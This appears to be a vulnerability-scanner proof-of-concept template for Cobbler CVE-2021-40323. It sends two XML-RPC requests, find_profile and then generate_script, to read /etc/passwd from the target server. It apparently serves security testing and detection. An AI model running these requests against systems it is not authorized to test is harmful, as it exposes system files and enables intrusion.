name: yaml-poc-cobbler_project-cobbler-rce-CVE-2021-40323
binding: e4bdbdcb-b1ca-4c87-9101-9322756538df
detail:
    author: jiapeng.han
    links:
        - https://github.com/cobbler/cobbler/commit/d8f60bbf14a838c8c8a1dba98086b223e35fe70a
        - https://github.com/cobbler/cobbler/releases/tag/v3.3.0
        - https://nvd.nist.gov/vuln/detail/CVE-2021-40323
        - https://vigilance.fr/vulnerability/Cobbler-three-vulnerabilities-37678
    vulnerability:
        id: e93e6e24-db99-430b-bf14-d4d5408697db
        level: critical
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /cobbler_api
            headers:
                Content-Type: text/xml
            body: |-
                <?xml version='1.0'?>
                        <methodCall>
                          <methodName>find_profile</methodName>
                          <params>
                            <param>
                              <value>
                                <struct>
                                  <member>
                                    <name>name</name>
                                    <value>
                                      <string>*</string>
                                    </value>
                                  </member>
                                </struct>
                              </value>
                            </param>
                          </params>
                        </methodCall>
            follow_redirects: false
        expression: response.status == 200
        output:
            search: '"<value><string>(?P<profile>debian_8.*?)</string></value>".submatch(response.body_string)'
            profile: search["profile"]
    r1:
        request:
            cache: true
            method: POST
            path: /cobbler_api
            headers:
                Content-Type: text/xml
            body: |-
                <?xml version='1.0'?>
                        <methodCall>
                          <methodName>generate_script</methodName>
                          <params>
                            <param>
                              <value>
                                <string>{{profile}}</string>
                              </value>
                            </param>
                            <param>
                              <value>
                                <string></string>
                              </value>
                            </param>
                            <param>
                              <value>
                                <string>/etc/passwd</string>
                              </value>
                            </param>
                          </params>
                        </methodCall>
            follow_redirects: false
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
expression: r0() && r1()
